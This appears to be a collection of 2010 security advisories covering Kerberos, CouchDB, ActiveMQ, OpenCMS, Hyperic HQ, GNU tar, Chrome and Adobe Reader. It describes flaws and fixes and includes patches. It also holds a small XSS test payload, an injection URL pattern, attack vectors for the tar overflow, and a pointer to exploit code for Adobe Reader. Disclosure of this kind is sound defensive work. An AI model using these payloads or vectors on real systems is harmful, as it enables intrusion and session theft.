shed further light on the problem.
Versions Affected
- -----------------
VSR has successfully exploited this issue in version x4.2.1. Earlier versions
may also be affected. Version x4.3.0 corrects the problem through use of a
random secret and the inclusion of the ""access"" value in the hash.
Vendor Response
- ---------------
The following timeline details TANDBERG's response to the reported issue:
2009-12-09 Preliminary notice to TANDBERG. TANDBERG responded immediately.
2009-12-22 VSR provided TANDBERG a draft advisory.
2009-12-28 TANDBERG confirmed that this issue was corrected in version x4.3.
2010-04-07 TANDBERG VCS firmware version x5.1.1 released [2] which corrected
other flaws identified by VSR.
2010-04-09 VSR advisory released.
Recommendation
- --------------
Upgrade to firmware version x4.3.0 (or newer) as soon as possible. If this is
not immediately possible, temporary mitigation could be achieved by changing
the ""$this->secret"" constant in the following files to something unpredictable:
/tandberg/web/lib/secure.php
/tandberg/web/user/lib/secure.php
Note that other vulnerabilities were identified in firmware versions prior to
x5.1.1. Therefore, upgrading to this version is recommended. See CVE-2009-4510
and CVE-2009-4511 for more information.
Common Vulnerabilities and Exposures (CVE) Information
- ------------------------------------------------------
The Common Vulnerabilities and Exposures (CVE) project has assigned
the number CVE-2009-4509 to this issue. This is a candidates for
inclusion in the CVE list (http://cve.mitre.org), which standardizes
names for security problems.
Acknowledgements
- ----------------
Thanks to TANDBERG for the quick initial response and cooperation.
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
References:
1. TANDBERG - Video Communication Server
http://www.tandberg.com/video-conferencing-network-infrastructure/video-communication-server.jsp
2. TANDBERG VCS Firmware Downloads
http://ftp.tandberg.com/pub/software/vcs/
3. TANDBERG VCS Version x4 Software Release Notes
http://ftp.tandberg.com/pub/software/vcs/TANDBERG%20Video%20Communication%20Server%20Software%20Release%20Notes%20(X4).pdf
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Copyright 2009,2010 Virtual Security Research, LLC. All rights reserved.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)
iD8DBQFLv/V9Q1RSUNR+T+gRAggEAJ492/MpyOUcUgpTtKCJHHOed920hQCfexkq
5hYHqemkmGHiM1F4/7QzPXk=
=jbo1
-----END PGP SIGNATURE-----"
15679,MITKRB5-SA-2010-003 [CVE-2010-0629] denial of service in kadmind in older krb5 releases,,CVE-2010-0629,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2010-003
MIT krb5 Security Advisory 2010-003
Original release: 2010-04-06
Last update: 2010-04-06
Topic: denial of service in kadmind in older krb5 releases
CVE-2010-0629
denial of service in kadmind in older krb5 releases
CVSSv2 Vector: AV:N/AC:L/Au:S/C:N/I:N/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 6.8
Access Vector: Network
Access Complexity: Low
Authentication: Single
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 5.3
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
In previous MIT krb5 releases krb5-1.5 through krb5-1.6.3, the
Kerberos administration daemon (kadmind) can crash due to referencing
freed memory. A legitimate user can trigger this crash by using a
newer version of the kadmin protocol than the server supports.
This is an implementation vulnerability in MIT krb5, and not a
vulnerability in the Kerberos protocol. This vulnerability is not
present in modern releases of MIT krb5.
IMPACT
======
An authenticated remote attacker could crash the Kerberos
administration daemon (kadmind), causing a denial of service.
AFFECTED SOFTWARE
=================
* kadmind in MIT releases krb5-1.5 through krb5-1.6.3.
FIXES
=====
* The krb5-1.7 release already contains a fix for this vulnerability.
* Apply the patch below. The corresponding SVN revision (r22427) in
our source tree contains additional use-after-free bugfixes; we
believe that it is impractical for an attacker to induce execution
of these sections of code.
Index: src/kadmin/server/server_stubs.c
===================================================================
- --- src/kadmin/server/server_stubs.c (revision 22426)
+++ src/kadmin/server/server_stubs.c (revision 22427)
@@ -1628,7 +1628,7 @@
}
if (ret.code != 0)
- - errmsg = krb5_get_error_message(handle ? handle->context : NULL, ret.code);
+ errmsg = krb5_get_error_message(NULL, ret.code);
else
errmsg = ""success"";
This patch is also available at
http://web.mit.edu/kerberos/advisories/2010-003-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2010-003-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2010-003.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
This bug has been public for a while at
http://krbdev.mit.edu/rt/Ticket/Display.html?id=5998
but the security consequence has not been previously widely known.
The security consequence was first made public in a limited context in
the Debian bug found at
http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=567052
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2010-0629
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0629
ACKNOWLEDGMENTS
===============
Thanks to Sol Jerome for reporting the kadmind crash to Debian.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/8B8DF501 2010-01-15 [expires: 2011-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
MIT krb5 bug #5998 contains the earliest description of this bug.
Debian bug #567052 (referenced above) contains the first public
indication of the security consequence of this bug. Under error
conditions, such as receiving an invalid kadmin API version number,
the kadmin RPC stub init_2_svc() attempts to call
krb5_get_error_message() on a krb5_context handle that is in a
previously-freed kadm5_server_handle_t object. This typically results
in a read operation on an invalid pointer, causing a crash and denial
of service. Releases prior to krb5-1.5 did not use extended error
information in this way, and therefore do not include the vulnerable
code.
The most likely cause of a crash is a legitimate user running a kadmin
client from the krb5-1.8 or newer release, which sends an API version
number not recognized by earlier releases.
REVISION HISTORY
================
2010-04-06 original release
Copyright (C) 2010 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAku7ebMACgkQSO8fWy4vZo6cZwCg+gPn5RIWuKBbdZi0NktOh+pC
SNMAnj3SeOel4cx5v9SprM1MRZG/ERCQ
=mKjF
-----END PGP SIGNATURE-----"
15739,[SECURITY] CVE-2008-2370: Apache CouchDB Timing Attack Vulnerability,,CVE-2008-2370,"CVE-2008-2370: Apache CouchDB Timing Attack Vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Apache CouchDB 0.8.0 to 0.10.1
Description:
Apache CouchDB versions prior to version 0.11.0 are vulnerable to
timing attacks, also known as side-channel information leakage,
due to using simple break-on-inequality string comparisons when
verifying hashes and passwords.
Mitigation:
All users should upgrade to CouchDB 0.11.0. Upgrades from the 0.10.x
series should be seamless. Users on earlier versions should consult
http://wiki.apache.org/couchdb/Breaking_changes
Example:
A canonical description of the attack can be found in
http://codahale.com/a-lesson-in-timing-attacks/
Credit:
This issue was discovered by Jason Davies of the Apache CouchDB
development team.
References:
http://couchdb.apache.org/
http://couchdb.apache.org/downloads.html
http://wiki.apache.org/couchdb/Breaking_changes
http://codahale.com/a-lesson-in-timing-attacks/
Jan Lehnardt
--"
15751,CVE-2010-0684: Apache ActiveMQ Persistent Cross-Site Scripting (XSS) Vulnerability,,CVE-2010-0684,"CVE-2010-0684: Apache ActiveMQ Persistent Cross-Site Scripting (XSS)
Vulnerability
==============================================================
Security Advisory 03.30.2010
I. BACKGROUND
Apache ActiveMQ is the most popular and powerful open source
messaging and Integration Patterns provider.
http://activemq.apache.org/
II. DESCRIPTION
Remote unauthenticated exploitation of an input validation
vulnerability in Apache Software Foundation's ActiveMQ server could
allow an attacker to perform a
stored or persistent cross-site scripting (XSS) attack. The code
responsible for parsing HTTP requests is vulnerable to an XSS
vulnerability. When parsing the JMSDestination parameter from a GET
request to /createDestination.action page, the value of this variable
is directly inserted into the HTML code that can be accessed by using
URLs such as /queues.jsp. This allows an attacker to run arbitrary
JavaScript in the context of the affected domain of the ActiveMQ
administration console.
III. ANALYSIS
Successful exploitation of this vulnerability allows an attacker to
conduct an XSS attack on a user. This could allow an attacker to steal
cookies, inject content into pages, or submit requests using the
user's credentials. To exploit this vulnerability, an attacker must
send malicious request to the vulnerable Active MQ server such as the
following request:
http://www.example.com/createDestination.action?JMSDestination=[XSS_PAYLOAD]
Once this request is sent, anyone accessing the ActiveMQ queues would
have the XSS payload executed in the context of the browser session
being used to browse using a URL such as:
http://www.example.com/queues.jsp
IV. DETECTION
The author and Apache Software Foundation's ActiveMQ group has
confirmed this vulnerability.
V. WORKAROUND
The author is currently unaware of any workaround for this issue but
fix has been released by the vendor.
VI. VENDOR RESPONSE
The Apache Software Foundation ActiveMQ team has addressed this
vulnerability by releasing version 5.3.1 of ActiveMQ.
More information can be found at the following URL.
http://issues.apache.org/activemq/browse/AMQ-2613
VII. CVE INFORMATION
The Common Vulnerabilities and Exposures (CVE) project has assigned
the name CVE-2010-0684 to this issue. This is a candidate for
inclusion in the CVE list (http://cve.mitre.org/), which standardizes
names for security problems.
VIII. DISCLOSURE TIMELINE
02/17/2010 Initial vendor notification
02/17/2010 Initial vendor response
02/23/2010 Vendor Fix committed to SVN
03/24/2010 ActiveMQ 5.3.1 publicly released to fix the issue
03/30/2010 Coordinated public disclosure
IX. CREDIT
This vulnerability was reported by Rajat Swarup (http://www.rajatswarup.com).
X. ACKNOWLEDGEMENT
The author wishes to thank Rob Davies and Dejan Bosanac of Apache
ActiveMQ team for fixing the issues on a high priority."
15796,CVE-2009-4505 OpenCMS OAMP Comments Module XSS,,CVE-2009-4505,"#######################################################################
# COMPASS SECURITY ADVISORY http://www.csnc.ch/
#######################################################################
#
# CVE ID : CVE-2009-4505
# Product: OpenCMS OAMP Comments Module
# Vendor: Open Source, Alkacon GmbH (Cologne, Germany)
# Subject: Cross-site scripting (XSS)
# Risk: High
# Effect: Anonymously exploitable
# Author: Cyrill Brunschwiler (cyrill.brunschwiler csnc ch)
# Date: March 24th 2010
#
#######################################################################
Introduction:
-------------
Cyrill Brunschwiler of Compass Security discovered a web application
security flaw in the OpenCMS OAMP comments module.
Description:
------------
The OAMP comments module allows OpenCMS users to add comments to pages.
However, the comment module reflects unfiltered user input. Following
that, attackers could injected HTML code and JavaScript code which gets
executed within all visitors web browsers.
Exploiting the vulnerability will lead to so-called cross-site scripting
(XSS) and allows the impersonation of logged-in OpenCMS web and
workplace
users. Attackers could also embbed arbitrary content such as faked login
forms or redirect OpenCMS users to malware pages.
Vulnerable:
-----------
OAMP comments module version 1.0.0
Patches:
--------
Get the latest version at http://cvs.opencms.org/
Fix:
----
All output must be encoded using HTML entities. For that purpose the
escapeXml attribute must not being set false on all c:out tags.
Moreover,
all fmt:param outputs must be encoded as well.
Example:
<%@ taglib prefix=""fn"" uri=""http://java.sun.com/jsp/jstl/functions"" %>
<fmt:param value=""${fn:escapeXml(comment.field['name'])}"" />
Alternatively one could use the OWASP ESAPI (Enterprise Security API) to
encode all output. For more details on the OWASP ESAPI consult the
google
code repository and see http://www.owasp.org/index.php/ESAPI
Example:
String clean = ESAPI.encoder().encodeForHTML(maliciousInput);
Milestones:
-----------
December 24th 2009, Vulnerability discovered
January 6th 2010, Vendor notified
March 13rd 2010, Fixed in CVS (m.jaeger)
References:
-----------
OpenCMS - http://www.opencms.org/en/
OpenCms from Alkacon Software is a professional, easy to use website
content management system. OpenCms helps content managers worldwide to
create and maintain beautiful websites fast and efficiently.
OpenCMS OAMP Modules -
http://www.alkacon.com/en/products/oamp/index.html
The Alkacon OpenCms Add-On Module Package (also called OAMP) is a set of
free, open source extension modules for OpenCms. Alkacon OAMP adds
front-
end related features to OpenCms that may be useful in case special
functionalities are required.
XSS - http://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
Cross-Site Scripting attacks are a type of injection problem, in which
malicious scripts are injected into the otherwise benign and trusted web
sites. Cross-site scripting (XSS) attacks occur when an attacker uses a
web application to send malicious code, generally in the form of a
browser
side script, to a different end user. Flaws that allow these attacks to
succeed are quite widespread and occur anywhere a web application uses
input from a user in the output it generates without validating or
encoding it.
An attacker can use XSS to send a malicious script to an unsuspecting
user. The end user's browser has no way to know that the script should
not
be trusted, and will execute the script. Because it thinks the script
came
from a trusted source, the malicious script can access any cookies,
session tokens, or other sensitive information retained by your browser
and used with that site. These scripts can even rewrite the content of
the
HTML page."
15801,CVE-2009-2907: SpringSource Hyperic HQ multiple XSS vulnerabilities,,CVE-2009-2907,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2009-2907: SpringSource Hyperic HQ multiple XSS vulnerabilities
Severity: Moderate
Vendor: SpringSource
Versions Affected:
SpringSource Hyperic HQ 4.2 pre-release versions
SpringSource Hyperic HQ 4.1.0 to 4.1.2
SpringSource Hyperic HQ 4.0.0 to 4.0.3
Earlier unsupported versions may also be affected
Summary:
Multiple fields are vulnerable to stored XSS.
Description:
Data retrieved from the database was used directly when forming the HTML output. This allowed an attacker to enter HTML in many of the input fields and have it used when the field was later displayed to a user. Data is now suitably encoded to make it safe for inclusion in HTML.
Mitigation:
Hyperic HQ Open Source users should upgrade to Hyperic HQ 4.2
Hyperic HQ Enterprise 4.1.x users may upgrade to Hyperic Enterprise 4.2 or 4.1.2.1
Hyperic HQ Enterprise 4.0.x users may upgrade to Hyperic Enterprise 4.2 or 4.0.3.2
Users of any earlier version should upgrade 4.2
Example:
Paste the following code into the description field:
<SCRIPT>alert(""XSS Vulnerable"")</SCRIPT>
Credit:
This vulnerability was discovered and reported to SpringSource by Aaron Kulick of CBS Interactive.
References:
http://www.springsource.com/security/hyperic-hq
The SpringSource Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32) - WinPT 1.2.0
iQIcBAEBAgAGBQJLqSfoAAoJECc+NjlVtVaxTmIP/1aEX8IK62sHc23F6P0ca4Cp
HkiUF+z2SJy06h8Ntq01ewoI9VoucWwo7VzdZo2iGtRezDKHD2uuxMCRgDCArNeZ
sjKRpZozeDPrWOBWe1YUP8shKltomi48oNS0N4mcVg3SQV4Lcu9dR9wppT0W/05C
1EqnJw75/36C187v1OhoiGDc1c+7V3aW2wndjhO6dgkBiigLd72kmx2zqux9kZWQ
0qpfqpTO3VxxUc0y47zNEDgI0e4q6iPL8NRvfcTdEI2cZNGWAEpWLeJW7fWAnsWd
T7b8ziRaQ1ZcHPUmp3CoCmGHGP/xOWhywYZXakuIJQpBUJ4ly46KicBWcHVExawR
KpQA8f5tZJyxHBn8PTxzz8+MYkwzhesyeHkKLcSfgO/0jfum+Ue1PMUIQQ682CQT
kEYkEKyUxIRxELaGiCTrpDdHp76MN/KzEl5DhgeOwhfd92M0U43twGNTL6xMOhbh
fdVEHL4tNeRcvX87mTk1vI0FtptGdsws1DDg2c1dP0fUFMTaySoK0oZG7cXr/NBt
xU/LYntxjuIQNj98eyPH9YjURGVII+0hcHY0WYVGI55dwxrtNj9Fb5UhiYuIIiQ/
woiLxIoIbW4bOfzlFEGPbn/TnpN8yzxJn36RbNU9i5hitTbLqBI9TERzM18hOFvj
+G0/W1h4a8IwgI2Fu59k
=NxoS
-----END PGP SIGNATURE-----"
15806,MITKRB5-SA-2010-002 denial of service in SPNEGO [CVE-2010-0628 VU#839413],,CVE-2010-0628,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2010-002
MIT krb5 Security Advisory 2010-002
Original release: 2010-03-23
Last update: 2010-03-23
Topic: denial of service in SPNEGO
CVE-2010-0628
VU#839413
denial of service in SPNEGO
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 7.8
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 6.1
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
In MIT krb5 releases krb5-1.7 and later, the SPNEGO GSS-API mechanism
can experience an assertion failure when receiving certain invalid
messages. This can cause a GSS-API application to crash.
This is an implementation vulnerability in MIT krb5, and not a
vulnerability in the Kerberos protocol.
IMPACT
======
An unauthenticated remote attacker could cause a GSS-API application,
including the Kerberos administration daemon (kadmind) to crash.
AFFECTED SOFTWARE
=================
* kadmind in MIT releases krb5-1.7 and later
* FTP daemon in MIT releases krb5-1.7 and later
* Third-party software using the GSS-API library from MIT krb5
releases krb5-1.7 and later
* MIT releases prior to krb5-1.7 did not contain the vulnerable code.
FIXES
=====
* The upcoming krb5-1.7.2 and krb5-1.8.1 releases will contain fixes
for this vulnerability.
* Apply the patch available at
http://web.mit.edu/kerberos/advisories/2010-002-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2010-002-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2010-002.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2010-0628
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0628
CERT: VU#839413
http://www.kb.cert.org/vuls/id/839413
ACKNOWLEDGMENTS
===============
Thanks to Nalin Dahyabhai, Jan iankko Lieskovsky, and Zbysek Mraz (all
from Red Hat) for discovering and reporting this vulnerability.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/8B8DF501 2010-01-15 [expires: 2011-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
A patch to fix CVE-2009-0845 interacted poorly with new functionality
introduced in krb5-1.7. This allowed an error condition to occur
where receiving an invalid packet could cause an assertion failure,
crashing the program and causing denial of service.
When the spnego_gss_accept_sec_context() function (in
src/lib/gssapi/spnego/spnego_mech.c) receives an invalid packet during
the beginning of a GSS-API protocol exchange, it can set some internal
state that tells it to send an error token without first creating a
context handle, but some subsequently executed code contains a call to
assert() that requires that the context handle be non-null.
REVISION HISTORY
================
2010-03-23 original release
Copyright (C) 2010 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAkupAZsACgkQSO8fWy4vZo4ETACgn9xRUl3CTCiRd2vF1PBOaQ8b
EfUAoPz32NUU/mk+H8kej8fWQFo3iwcZ
=LHMP
-----END PGP SIGNATURE-----"
15873,CVE-2010-0188 Exploit Code,,CVE-2010-0188,"# Exploit Title: Adobe Acrobat libtiff Remote Code Execution
# Date: 2010-03-12
# Author: villy( http://bugix-security.blogspot.com/)
# Software Link: http://adobe.com/
# Version: Adobe Reader 9.x < 9.3.1
# Tested on: windows xp(sp2 and xp3)
# CVE : CVE-2010-0188
Full python code on the link :
http://bugix-security.blogspot.com/2010/03/adobe-pdf-libtiff-working-exploitcve.html
Exploit works with disabled js, and can be remote exploitable with adobe browser plugin."
15898,CVE-2010-0624: Heap-based buffer overflow in GNU Tar and GNU Cpio,,CVE-2010-0624,"I. BACKGROUND
GNU Tar and GNU Cpio are popular programs for managing archive
files. Both programs are included in many linux distributions. GNU Tar
is commonly used for exchanging source code archives.
Both programs include a client implementation for the remote mag tape
protocol (rmt). This protocol allows accessing a tape device attached
to a remote system via a rsh/ssh. It can also be used to
extract/create archive files on another system directly using Tar/Cpio
(although using rmt for accessing remote files is deprecated).
II. DESCRIPTION
The rmt client implementation of GNU Tar/Cpio contains a heap-based
buffer overflow which possibly allows arbitrary code execution.
The vulnerability is in the function rmt_read__ in lib/rtapelib.c:
/* Read up to LENGTH bytes into BUFFER from remote tape connection HANDLE.
Return the number of bytes read on success, SAFE_READ_ERROR on error. */
size_t
rmt_read__ (int handle, char *buffer, size_t length)
{
char command_buffer[COMMAND_BUFFER_SIZE];
size_t status;
size_t rlen;
size_t counter;
sprintf (command_buffer, ""R%lu "", (unsigned long) length);
if (do_command (handle, command_buffer) == -1
|| (status = get_status (handle)) == SAFE_READ_ERROR)
return SAFE_READ_ERROR;
for (counter = 0; counter < status; counter += rlen, buffer += rlen)
{
rlen = safe_read (READ_SIDE (handle), buffer, status - counter);
if (rlen == SAFE_READ_ERROR || rlen == 0)
{
_rmt_shutdown (handle, EIO);
return SAFE_READ_ERROR;
}
}
return status;
}
The function first writes to the server how many bytes it wants to
read using sprintf() and do_command(). Then it reads the number of
bytes available into the variable status using get_status(). In the
for loop, the function reads status bytes from the server into the
buffer. However, it doesn't check whether status is actually less than
or equal the length of the buffer given by the parameter length. So a
malicious rmt server can overwrite data on the heap following the
buffer. Successful exploitation of this bug could possibly lead to
arbitrary code execution.
III. EXPLOIT VECTORS
The problem can be exploited when using an untrusted/compromised rmt
server. The impact is fairly low since rmt is rarely used today and
the rmt server is in most cases considered trustworthy.
However, this vulnerability can also be triggered when trying to
extract a tar file with a colon in the filename. In this case, tar
interprets the part before the colon as a hostname (or user@hostname)
and opens a rsh connection to this host. This may also be exploited if
the user uses the aunpack script from atool [1] to extract a tar
file. Many users of GNU Tar or atool don't know that rmt exists and
that tar treats filenames containing a colon differently. So a user
might run tar or aunpack on a file which he has received via email or
downloaded from a web page. Many users enter filenames using bash
auto-completion and thus might not even notice that there is anything
wrong with the filename.
For Cpio, this attack vector does not work since Cpio requires the
option --rsh-command to use rmt. Tar has compiled in the default value
""/usr/bin/rsh"".
It is also possible that there are scripts out there which
automatically call Tar to extract a file with a name provided by an
untrusted source. If the script passes the filename with an (absolute
or relative) path or uses the --force-local option, this problem can
be avoided
Notes on rsh/ssh:
GNU Tar uses /usr/bin/rsh to execute the rmt server implementation
(/usr/bin/rmt) on the server. On most modern linux systems
/usr/bin/rsh is just a symlink to ssh. So an attempt to exploit this
vulnerability might make ssh ask the user whether to add a new key to
the known_hosts file. This gives users the possibility to cancel the
program and thus prevent successful exploitation. However, the problem
can still be exploited if the attacker has compromised a machine which
is already in the users known_hosts file or if the user has set
StrictHostKeyChecking to ""no"" in his ssh configuration.
IV. WORKAROUND
Do not use the integrated rmt client of GNU Tar/Cpio if the rmt server
is untrusted or potentially compromised. Always check that the
filename doesn't contain a colon when extracting tar files or use the
--force-local option.
V. SOLUTION:
Upgrade GNU Tar to version 1.23 and GNU Cpio to version 2.11.
Some Linux Distributions are going to release upgrades packages
today or in the next few days.
VI. DISCLOSURE TIMELINE
2010/02/12: Vendor and major Linux Distributions notified
2010/03/10: Public disclosure
VI. Credit
This vulnerability has been discovered by Jakob Lell from the
TU Berlin computer security working group (AGRS).
http://www.agrs.tu-berlin.de/parameter/en/
A copy of this advisory is also available on the following page:
http://www.agrs.tu-berlin.de/index.php?id=78327
[1] http://www.nongnu.org/atool/"
16060,MITKRB5-SA-2010-001 [CVE-2010-0283] krb5-1.7 KDC denial of service,,CVE-2010-0283,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2010-001
MIT krb5 Security Advisory 2010-001
Original release: 2010-02-16
Last update: 2010-02-16
Topic: krb5-1.7 KDC denial of service
CVE-2010-0283
krb5-1.7 KDC denial of service
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:F/RL:O/RC:C
CVSSv2 Base Score: 7.8
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 6.4
Exploitability: Functional
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
Improper input validation in the KDC can cause an assertion failure
and process termination. A functional exploit exists, but is not
known to be publicly circulated. Releases prior to krb5-1.7 did not
contain the vulnerable code.
This is an implementation vulnerability in MIT krb5, and is not a
vulnerability in the Kerberos protocol.
IMPACT
======
An unauthenticated remote attacker can send an invalid request to a
KDC process that will cause it to crash due to an assertion failure,
creating a denial of service.
AFFECTED SOFTWARE
=================
* KDC in MIT krb5-1.7 and later
* Prerelease (alpha test) code for krb5-1.8 is also vulnerable.
FIXES
=====
* The upcoming krb5-1.7.2 release will contain a fix for this
vulnerability.
* The final krb5-1.8 release will contain a fix for this
vulnerability.
* For the krb5-1.7 and krb5-1.7.1 releases, apply the following patch:
diff --git a/src/kdc/do_as_req.c b/src/kdc/do_as_req.c
index 52fbda5..680e6a1 100644
- --- a/src/kdc/do_as_req.c
+++ b/src/kdc/do_as_req.c
@@ -137,6 +137,11 @@ process_as_req(krb5_kdc_req *request, krb5_data *req_pkt,
session_key.contents = 0;
enc_tkt_reply.authorization_data = NULL;
+ if (request->msg_type != KRB5_AS_REQ) {
+ status = ""msg_type mismatch"";
+ errcode = KRB5_BADMSGTYPE;
+ goto errout;
+ }
errcode = kdc_make_rstate(&state);
if (errcode != 0) {
status = ""constructing state"";
diff --git a/src/kdc/do_tgs_req.c b/src/kdc/do_tgs_req.c
index 12180ff..c8cf692 100644
- --- a/src/kdc/do_tgs_req.c
+++ b/src/kdc/do_tgs_req.c
@@ -135,6 +135,8 @@ process_tgs_req(krb5_data *pkt, const krb5_fulladdr *from,
retval = decode_krb5_tgs_req(pkt, &request);
if (retval)
return retval;
+ if (request->msg_type != KRB5_TGS_REQ)
+ return KRB5_BADMSGTYPE;
/*
* setup_server_realm() sets up the global realm-specific data pointer.
diff --git a/src/kdc/fast_util.c b/src/kdc/fast_util.c
index d88e0cb..2639047 100644
- --- a/src/kdc/fast_util.c
+++ b/src/kdc/fast_util.c
@@ -384,7 +384,7 @@ krb5_error_code kdc_fast_handle_error
krb5_data *encoded_e_data = NULL;
memset(outer_pa, 0, sizeof(outer_pa));
- - if (!state->armor_key)
+ if (!state || !state->armor_key)
return 0;
fx_error = *err;
fx_error.e_data.data = NULL;
This patch is also available at
http://web.mit.edu/kerberos/advisories/2010-001-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2010-001-patch.txt.asc
* The above patch will apply to krb5-1.8 prerelease code if whitespace
is ignored.
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2010-001.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2010-0283
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0283
ACKNOWLEDGMENTS
===============
Thanks to Emmanuel Bouillon (NATO C3 Agency) for discovering and
reporting this vulnerability.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/8B8DF501 2010-01-15 [expires: 2011-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
In new code introduced in the KDC for the krb5-1.7 release, code that
handles authorization data (handle_tgt_authdata()) contains a call to
assert() that ensures that the function arguments are consistent with
value of the msg_type field of the request that it is processing.
This assertion can fail because the msg_type can be inconsistent with
the ASN.1 tag that previously-executed code used to choose whether to
process the request as a request for initial tickets (AS-REQ) or as a
request for additional tickets (TGS-REQ).
REVISION HISTORY
================
2010-02-16 original release
Copyright (C) 2010 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAkt66lcACgkQSO8fWy4vZo7I0ACfasGx8aeoSggpGZ+pT9rbcKSj
QJIAoNPvn30+XmGb5Q7nXaAy0jiLIftg
=yYBl
-----END PGP SIGNATURE-----"
16063,Chrome Password Manager Cross Origin Weakness (CVE-2010-0556),,CVE-2010-0556,"Virtual Security Research, LLC.
http://www.vsecurity.com/
Security Advisory
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Advisory Name: Chrome Password Manager Cross Origin Weakness
Release Date: 2010-02-15
Application: Google Chrome Web Browser
Versions: 4.0.249.78, 3.0.195.38, and likely earlier
Severity: Medium/Low
Author: Timothy D. Morgan <tmorgan (a) vsecurity . com>
Vendor Status: Update Released [2]
CVE Candidate: CVE-2010-0556
Reference: http://www.vsecurity.com/resources/advisory/20100215-1/
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Product Description
-------------------
""Google Chrome is a web browser that runs web pages and applications with
lightning speed."" [1]
Vulnerability Overview
----------------------
In mid-January, VSR identified a vulnerability in Google Chrome which could be
used in phishing attacks in specific types of web sites. This issue may make it
much easier to convince a victim to submit web application credentials to the
attacker's site.
Vulnerability Details
---------------------
As with many modern browsers, Google Chrome implements a password manager to
help users keep track of credentials used on various web sites. It may be used
to store either HTTP authentication credentials or form-based credentials.
The vulnerability surfaces in a situation where a user visits a web page which
includes an embedded object, such as an image, from a third-party site. If an
attacker had control of the third-party web server, he could request credentials
from the user via HTTP authentication. This style of attack has been documented
in the past, and some of variations on this theme are explored in a recent paper
by VSR [5].
However, in the case of vulnerable versions of Google Chrome, the password
manager may pre-fill the authentication dialog box with credentials intended for
parent page's domain, leaving users one click away from account compromise.
